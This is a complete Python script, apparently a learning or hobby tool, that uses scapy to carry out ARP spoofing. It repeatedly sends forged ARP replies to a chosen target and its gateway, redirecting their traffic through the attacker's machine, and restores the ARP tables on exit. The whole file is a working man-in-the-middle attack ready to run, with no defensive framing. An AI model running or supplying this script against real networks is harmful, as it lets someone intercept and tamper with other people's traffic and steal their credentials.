#!/bin/env python
import time

import scapy.all as scapy
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Client target ip address")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway ip address")
    options = parser.parse_args()[0]
    if not options.target:
        parser.error("[-] Please specify an client ip for target, use --help for more info.")
    elif not options.gateway:
        parser.error("[-] Please specify an gateway address, use --help for more info.")
    return options


option = get_arguments()


def get_mac(ip):
    # Set the ip address to ask
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answerd_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=1)[0]

    return answerd_list[0][1].hwsrc


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


def spoof(target_ip, router_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
    scapy.send(packet, verbose=False, count=4)


target_ip = option.target
router_ip = option.gateway
packet_count_sent = 0
try:
    while True:
        spoof(target_ip, router_ip)
        packet_count_sent += 1
        print("\r[+] Packet Sent: " + str(packet_count_sent), end="")
        spoof(router_ip, target_ip)
        packet_count_sent += 1
        print("\r[+] Packet Sent: " + str(packet_count_sent), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL C......... Quitting the program.\n")
    restore(target_ip, router_ip)
    restore(router_ip, target_ip)